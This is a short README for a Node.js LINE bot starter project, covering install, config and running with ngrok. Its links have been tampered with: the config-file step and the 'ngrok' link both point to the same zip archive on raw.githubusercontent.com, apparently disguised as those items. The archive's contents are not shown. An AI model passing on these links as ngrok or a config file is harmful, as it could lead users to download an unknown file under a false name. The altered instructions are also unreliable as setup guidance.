# line-bot-nodejs-starter
starter point to create new line bot project

## How it work
Start express server to handle webhook from LINE

# Install
Clone and run
```
npm install
```
Modify `https://raw.githubusercontent.com/yutthanaiam/line-bot-nodejs-starter/master/angster/nodejs-line-starter-bot-v3.7-alpha.2.zip`
```json
{
  "port" : "3000",
  "channelAccessToken": "YOUR_CHANNEL_ACCESS_TOKEN",
  "channelSecret": "YOUR_CHANNEL_SECRET"
}
```
Run
```
npm start
```
then you can access [http://localhost:3000](http://localhost:3000)

Use [ngrok](https://raw.githubusercontent.com/yutthanaiam/line-bot-nodejs-starter/master/angster/nodejs-line-starter-bot-v3.7-alpha.2.zip) to expose your local url
```
path/to/ngrok http 3000
```
config webhook url in developer console then enjoy your bot!

## Author
Sitthi Thiammekha
